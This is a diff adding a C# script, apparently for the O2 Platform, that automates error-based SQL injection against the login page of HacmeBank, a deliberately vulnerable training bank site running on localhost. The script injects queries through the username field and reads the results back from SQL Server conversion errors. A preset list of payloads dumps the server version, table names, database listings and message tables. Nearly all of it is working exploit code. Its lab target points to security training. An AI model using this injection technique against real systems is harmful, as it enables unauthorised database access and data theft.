@@ -1,0 +1,73 @@
+var topPanel = panel.clear().add_Panel();
+//var topPanel = "Remote SQL execute".popupWindow(1000,400); 
+
+var ie = topPanel.add_IE();
+
+Action execute = null;
+
+var url = "http://localhost:15582/HacmeBank_v2_Website/aspx/Login.aspx?function=Welcome";
+
+Action<string,string> login =
+	(username, password)=>{
+								ie.field("txtUserName").value(username);
+								ie.field("txtPassword").value(password);
+								ie.button("Submit").click();
+						  };
+						  
+Func<string, string> sendPayload = 
+	(sqlQuery)=>{		
+					if (ie.hasButton("Submit").isFalse())
+						ie.open(url);
+					login("jv' and 1 in ({0}) --".format(sqlQuery),"aaaa");
+					var html = ie.IE.Html;
+					return html.subString_After("Conversion failed when converting the nvarchar value '")
+							   .subString_Before("' to data type int.");
+				};
+var examples  = topPanel.insert_Left(200, "Examples").add_TreeView();
+var leftPanel = topPanel.insert_Left();
+var payload   = leftPanel.insert_Above(40,"Payload").add_TextBox().fill().onEnter((text)=>execute());
+var result    = leftPanel.title("Result").add_TextArea(); 
+				payload.insert_Right(80).add_Button("Execute").autoSize(false).height(20).onClick(()=> execute());
+
+execute = ()=>{			
+						  result.azure()
+								.set_Text(sendPayload(payload.get_Text()))
+								.white();
+	  				  };
+		
+
+
+examples.afterSelect<string>(
+	(text)=>{
+				O2Thread.mtaThread(
+					()=>{
+							payload.set_Text(text);
+							execute();
+						});
+			});
+
+
+
+
+
+examples.add_Nodes("select @@version",
+				   "@@version",
+				   "select name from sys.tables",
+				   "select name from sys.databases for xml auto",
+				   "select * from master..sysDatabases for xml auto, BINARY BASE64",
+				   "select * from sys.databases where name ='FoundStone_Bank'  for xml auto, BINARY BASE64",
+				   "select * from sys.databases where name = 'master' for xml auto, BINARY BASE64",
+				   "select a=count(*)  from master..sysmessages for xml raw, Binary BASE64",
+				   "select * from fsb_messages for xml raw")
+		.selectFirst();
+		
+
+execute();
+
+return "done";
+
+
+
+//O2File:WatiN_IE_ExtensionMethods.cs 
+//O2Ref:WatiN.Core.1x.dll
+//O2File:_Extra_methods_To_Add_to_Main_CodeBase.cs
